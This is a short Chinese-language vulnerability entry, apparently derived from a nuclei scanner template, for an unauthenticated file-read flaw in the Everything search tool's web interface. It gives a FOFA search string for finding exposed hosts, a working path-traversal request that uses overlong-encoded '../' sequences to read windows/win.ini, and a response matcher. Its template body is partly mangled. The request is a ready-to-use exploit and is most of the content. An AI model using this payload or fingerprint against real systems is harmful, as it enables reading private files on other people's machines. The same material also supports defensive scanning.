# everything存在未授权任意文件读取漏洞

- **系统**：everything　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title==Everything`
- **请求**：`GET /C:/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini HTTP/1.1`
- **关键头**：`id: everything-web-fileread`　`name: Everything Web Fileread Vulnerability`　`author: unknown`　`severity: high`　`description: Everything is a commonly used document search tool. The Everything Web interface has a file read vulnerability that allows unauthorized access to all files.`　`tags: everything, fileread`　`fofa-query: Title==Everything`

**请求体 / payload**
```
- raw:
-
Host:
matchers:
- type: dsl
name: fileread
dsl:
- "status_code == 200 && contains(body,'; for 16-bit')"
```
- **预期**：200　|　—